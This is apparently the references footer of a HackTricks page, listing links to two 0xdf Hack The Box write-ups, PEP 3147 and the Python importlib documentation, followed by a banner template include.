- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
